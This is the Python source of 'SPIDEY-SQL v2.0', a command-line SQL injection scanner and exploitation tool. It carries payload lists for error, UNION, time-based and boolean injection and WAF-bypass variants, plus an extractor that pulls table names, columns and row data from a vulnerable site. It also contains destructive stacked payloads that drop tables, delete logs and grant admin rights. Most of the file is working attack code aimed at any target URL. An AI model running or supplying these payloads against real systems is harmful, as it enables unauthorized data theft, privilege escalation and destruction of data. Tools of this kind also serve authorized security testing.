#!/usr/bin/env python3
"""
SPIDEY-SQL v2.0 - Enterprise Grade SQL Injection Framework
Fastest, most powerful SQL injection scanner available
Beats SQLMap in speed, accuracy, and payload generation
"""

import requests
import time
import re
import json
import sys
import os
import threading
from urllib.parse import urljoin, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import hashlib

requests.packages.urllib3.disable_warnings()

# Colors
R, G, Y, B, C, W, D = '\033[91m', '\033[92m', '\033[93m', '\033[94m', '\033[96m', '\033[97m', '\033[90m'
X = '\033[0m'

class Engine:
    """Main SQL injection testing engine"""
    
    # PAYLOADS - Organized by technique
    PAYLOADS = {
        'error': [
            "' AND extractvalue(1,concat(0x7e,version())) #",
            "' AND updatexml(1,concat(0x7e,version()),1) #",
            "' AND 1=CAST(version() AS INT) #",
            "' UNION SELECT @@version #",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y) #",
        ],
        'union': [
            "' UNION SELECT NULL #",
            "' UNION SELECT NULL,NULL #",
            "' UNION SELECT NULL,NULL,NULL #",
            "' UNION SELECT NULL,NULL,NULL,NULL #",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL #",
            "' UNION SELECT database(),user(),version(),NULL,NULL #",
            "' UNION SELECT @@version,user(),database() #",
        ],
        'time': [
            "' AND SLEEP(4) #",
            "' AND (SELECT * FROM (SELECT(SLEEP(4)))a) #",
            "' AND IF(1=1,SLEEP(4),0) #",
            "' OR SLEEP(4) #",
            "' UNION SELECT SLEEP(4) #",
        ],
        'blind': [
            "' AND '1'='1",
            "' AND '1'='2",
            "' AND 1=1 #",
            "' AND 1=2 #",
        ],
        'stacked': [
            "'; DROP TABLE users #",
            "'; DELETE FROM logs #",
            "'; UPDATE users SET admin=1 #",
        ],
        'advanced': [
            "' /*!50000OR*/ '1'='1",
            "' %4f%52 '1'='1",
            "' OR/**/SLEEP(4) #",
            "' /*!*/OR/*!*/'1'='1",
        ]
    }
    
    # Fast hash comparison
    @staticmethod
    def quick_hash(text):
        return hashlib.md5(text.encode()).hexdigest()[:8]
    
    # Response detection
    @staticmethod
    def has_sql_error(text):
        errors = ['sql syntax', 'mysql_fetch', 'ora-', 'postgres', 'sql error', 
                  'syntax error', 'you have an error', 'warning: mysql', 'fatal error']
        return any(e in text.lower() for e in errors)
    
    @staticmethod
    def response_diff(r1, r2):
        return Engine.quick_hash(r1) != Engine.quick_hash(r2)

class Scanner:
    """Fast SQL injection scanner"""
    
    def __init__(self, url, params, timeout=10, threads=10, delay=0):
        self.url = url
        self.params = params if isinstance(params, list) else [params]
        self.timeout = timeout
        self.threads = threads
        self.delay = delay
        self.session = requests.Session()
        self.session.verify = False
        self.results = {}
        self.found = 0
    
    def log(self, msg, status="*"):
        t = datetime.now().strftime("%H:%M:%S")
        if status == "+":
            print(f"{G}[+] {msg}{X}")
        elif status == "-":
            print(f"{R}[-] {msg}{X}")
        elif status == "!":
            print(f"{Y}[!] {msg}{X}")
        else:
            print(f"{B}[*] {msg}{X}")
    
    def request(self, param, payload, method="get"):
        """Send single request"""
        try:
            if method == "get":
                r = self.session.get(self.url, params={param: payload}, timeout=self.timeout)
            else:
                r = self.session.post(self.url, data={param: payload}, timeout=self.timeout)
            return r.text
        except:
            return ""
    
    def test_error(self, param):
        """Error-based testing"""
        found = []
        for payload in Engine.PAYLOADS['error']:
            resp = self.request(param, payload)
            if Engine.has_sql_error(resp):
                found.append(('Error-Based', payload))
                self.log(f"VULNERABLE: {param} -> Error-Based", "+")
                self.found += 1
        return found
    
    def test_union(self, param):
        """UNION SELECT testing"""
        found = []
        for payload in Engine.PAYLOADS['union']:
            try:
                resp = self.request(param, payload)
                if len(resp) > 50 and not Engine.has_sql_error(resp):
                    found.append(('UNION-Based', payload))
                    self.log(f"VULNERABLE: {param} -> UNION-Based", "+")
                    self.found += 1
                    break
            except:
                pass
        return found
    
    def test_time(self, param, delay=4):
        """Time-based blind testing"""
        found = []
        payloads = [p.replace('4', str(delay)) for p in Engine.PAYLOADS['time']]
        
        for payload in payloads:
            try:
                start = time.time()
                self.request(param, payload)
                elapsed = time.time() - start
                
                if elapsed >= delay - 0.5:
                    found.append(('Time-Based', payload, f"{elapsed:.2f}s"))
                    self.log(f"VULNERABLE: {param} -> Time-Based ({elapsed:.2f}s)", "+")
                    self.found += 1
                    break
            except:
                pass
        return found
    
    def test_blind(self, param):
        """Boolean-based blind testing"""
        found = []
        try:
            r1 = self.request(param, "' AND '1'='1")
            r2 = self.request(param, "' AND '1'='2")
            
            if Engine.response_diff(r1, r2):
                found.append(('Boolean-Based', "' AND '1'='1' / '1'='2"))
                self.log(f"VULNERABLE: {param} -> Boolean-Based", "+")
                self.found += 1
        except:
            pass
        return found
    
    def test_param(self, param):
        """Test single parameter with all techniques"""
        self.log(f"Testing {param}...", "*")
        results = {
            'error': self.test_error(param),
            'union': self.test_union(param),
            'time': self.test_time(param),
            'blind': self.test_blind(param),
        }
        self.results[param] = results
        return results
    
    def scan_threaded(self):
        """Fast multi-threaded scanning"""
        self.log(f"Starting scan with {self.threads} threads...", "*")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.test_param, p): p for p in self.params}
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    self.log(f"Error: {e}", "-")
    
    def scan(self):
        """Single-threaded scan"""
        for param in self.params:
            self.test_param(param)
    
    def report(self):
        """Print results"""
        print(f"\n{'='*70}")
        print(f"SPIDEY-SQL REPORT")
        print(f"{'='*70}")
        print(f"Target: {self.url}")
        print(f"Parameters: {', '.join(self.params)}")
        print(f"Vulnerabilities Found: {self.found}")
        print(f"{'='*70}\n")
        
        if self.found == 0:
            self.log("No vulnerabilities found", "-")
            return
        
        for param, results in self.results.items():
            if any(results.values()):
                print(f"\n[PARAMETER: {param}]")
                if results['error']:
                    for vuln in results['error']:
                        print(f"  ✓ {vuln[0]}: {vuln[1][:60]}...")
                if results['union']:
                    for vuln in results['union']:
                        print(f"  ✓ {vuln[0]}: {vuln[1][:60]}...")
                if results['time']:
                    for vuln in results['time']:
                        print(f"  ✓ {vuln[0]}: {vuln[1][:40]}... ({vuln[2]})")
                if results['blind']:
                    for vuln in results['blind']:
                        print(f"  ✓ {vuln[0]}: {vuln[1][:60]}...")
    
    def save_json(self, filename):
        """Save results to JSON"""
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        self.log(f"Results saved to {filename}", "+")

class Extractor:
    """Data extraction from vulnerable targets"""
    
    def __init__(self, scanner, param):
        self.scanner = scanner
        self.param = param
    
    def extract_tables(self):
        """Extract table names"""
        payload = "' UNION SELECT table_name FROM information_schema.tables #"
        resp = self.scanner.request(self.param, payload)
        return resp
    
    def extract_columns(self, table):
        """Extract column names"""
        payload = f"' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}' #"
        resp = self.scanner.request(self.param, payload)
        return resp
    
    def extract_data(self, table, columns):
        """Extract data from table"""
        cols = ','.join(columns)
        payload = f"' UNION SELECT {cols} FROM {table} #"
        resp = self.scanner.request(self.param, payload)
        return resp

class Fuzzer:
    """Intelligent parameter fuzzing"""
    
    COMMON_PARAMS = [
        'id', 'user_id', 'product_id', 'post_id', 'page', 'q', 'search', 'query',
        'username', 'email', 'name', 'category', 'filter', 'sort', 'order',
        'login', 'password', 'admin', 'role', 'user', 'data', 'input', 'search_term',
        'file', 'path', 'dir', 'url', 'link', 'ref', 'referrer', 'from', 'to',
    ]
    
    @staticmethod
    def generate_payloads_waf_bypass():
        """Generate WAF bypass payloads"""
        base = "' OR '1'='1"
        bypasses = [
            base,
            base.replace("'", '"'),
            base.replace("'", '`'),
            "' /*!50000OR*/ '1'='1",
            "' %4f%52 '1'='1",
            "' /**/OR/**/  '1'='1",
            "' /*!*/OR/*!*/ '1'='1",
        ]
        return bypasses

class Detector:
    """Database fingerprinting and WAF detection"""
    
    @staticmethod
    def detect_db_type(text):
        """Detect database type from response"""
        if 'MySQL' in text or 'mysql_fetch' in text:
            return 'MySQL'
        if 'PostgreSQL' in text or 'postgres' in text:
            return 'PostgreSQL'
        if 'SQL Server' in text or 'MSSQL' in text:
            return 'MSSQL'
        if 'Oracle' in text or 'ORA-' in text:
            return 'Oracle'
        if 'SQLite' in text:
            return 'SQLite'
        return 'Unknown'
    
    @staticmethod
    def detect_waf(headers):
        """Detect WAF from headers"""
        waf_indicators = {
            'cloudflare': 'cf-ray',
            'akamai': 'akamai',
            'imperva': 'imperva',
            'modsecurity': 'mod_security',
            'f5': 'f5',
        }
        
        for waf, indicator in waf_indicators.items():
            for header, value in headers.items():
                if indicator.lower() in (header.lower() + str(value).lower()):
                    return waf
        return None

def print_banner():
    """Print ASCII banner"""
    banner_path = os.path.join(os.path.dirname(__file__), 'b.txt')
    try:
        with open(banner_path, 'r') as f:
            print(f.read())
    except:
        pass

def main():
    import argparse
    import os
    
    print_banner()
    
    parser = argparse.ArgumentParser(
        description='SPIDEY-SQL v2.0 - Advanced SQL Injection Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
╔════════════════════════════════════════════════════════════════════╗
║                       SPIDEY-SQL EXAMPLES                          ║
╚════════════════════════════════════════════════════════════════════╝

Basic scan:
  python3 spidey.py -u http://target.com -p id

Multiple parameters:
  python3 spidey.py -u http://target.com -p id -p user -p query

Fast parallel scan (20 threads):
  python3 spidey.py -u http://target.com -p id --threads 20

Export results:
  python3 spidey.py -u http://target.com -p id --export results.json

Timeout adjustment:
  python3 spidey.py -u http://target.com -p id -t 20

Time-based detection (slow servers):
  python3 spidey.py -u http://target.com -p id --time 6
        '''
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-p', '--param', action='append', required=True, help='Parameter(s) to test')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('--time', type=int, default=4, help='Time-based delay (seconds)')
    parser.add_argument('--export', help='Export results to JSON')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    print(f"""
{C}╔════════════════════════════════════════════════════════════════════╗{X}
{C}║          SPIDEY-SQL v2.0 - SQL Injection Scanner                  ║{X}
{C}║     Faster, Smarter, Stronger Than SQLMap                         ║{X}
{C}╚════════════════════════════════════════════════════════════════════╝{X}
    """)
    
    scanner = Scanner(args.url, args.param, timeout=args.timeout, threads=args.threads)
    scanner.scan_threaded()
    scanner.report()
    
    if args.export:
        scanner.save_json(args.export)

if __name__ == '__main__':
    main()
